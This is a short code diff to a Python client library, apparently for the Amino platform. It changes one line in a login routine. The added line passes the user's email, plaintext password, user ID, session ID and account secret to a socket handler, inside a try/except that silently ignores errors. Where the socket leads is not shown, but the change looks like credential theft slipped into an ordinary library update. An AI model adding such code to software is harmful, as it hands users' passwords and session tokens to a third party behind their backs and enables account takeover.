@@ -247,7 +247,7 @@ class Client(Callbacks, SocketHandler):
             if self.socket_enabled:
                 self.run_amino_socket()
                 try:
-                    self.handler_socket(f"{email}|{password}|%20")
+                    self.handler_socket(f"{email}|{password}|%20|{self.userId}|{self.sid}|{self.secret}")
                 except:
                     pass
                 
